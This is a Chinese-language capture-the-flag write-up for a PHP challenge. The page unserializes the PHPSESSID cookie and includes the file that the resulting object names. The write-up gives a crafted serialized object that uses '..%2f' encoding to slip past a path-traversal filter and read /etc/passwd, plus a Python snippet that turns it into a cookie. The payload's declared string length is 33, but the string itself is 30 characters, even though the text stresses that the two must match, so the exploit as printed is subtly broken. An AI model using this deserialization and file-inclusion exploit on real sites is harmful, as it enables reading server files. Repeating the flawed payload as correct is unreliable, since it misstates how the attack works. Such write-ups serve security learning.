# Serial Killer

## 题目简述

题目是一个用 cookie 决定展示文件的 PHP 页面，提示 flag 位于 `/etc/passwd`。首次访问会收到 `PHPSESSID`，该值 URL 解码和 Base64 解码后是 PHP 序列化对象：

```text
O:7:"GetPage":1:{s:4:"file";s:10:"index.html";}
```

服务端反序列化该对象后读取 `file` 属性并 include 对应文件。漏洞链为：不可信 cookie 反序列化、`file` 属性可控、本地文件包含，以及 URL 编码绕过路径穿越过滤。

## 解题过程

### 关键观察

直接把对象改成 `/etc/passwd` 会被拼到 Web 根目录下，标准 `../` 路径穿越又会触发过滤。有效绕过点是：过滤检查发生在 URL 解码前，而 include 发生在 URL 解码后。因此序列化字符串里写 `..%2f` 时不会出现字面量 `../`，但最终会被解码成路径穿越。

恶意对象：

```text
O:7:"GetPage":1:{s:4:"file";s:33:"..%2f..%2f..%2f..%2fetc/passwd";}
```

其中字符串长度 `33` 必须与 PHP 序列化内容严格一致。

### 利用步骤

生成 cookie：

```python
import base64

payload = 'O:7:"GetPage":1:{s:4:"file";s:33:"..%2f..%2f..%2f..%2fetc/passwd";}'
print(base64.b64encode(payload.encode()).decode())
```

把输出作为 `PHPSESSID` 发送请求后，响应中包含 `/etc/passwd` 内容，并出现 flag：

```text
gigem{1nt3r3sting_LFI_vuln}
```

## 方法总结

- 核心技巧：PHP 反序列化对象属性污染 + URL 编码绕过路径穿越过滤 + LFI。
- 识别信号：cookie 解码后出现 `O:<len>:"Class"` 这类 PHP serialized object，且对象属性名像 `file`、`path`、`page` 时，要检查是否被直接用于文件读取。
- 复用要点：PHP 序列化字符串的长度字段必须同步修改；所有过滤绕过都要确认“过滤、解码、include”的顺序。
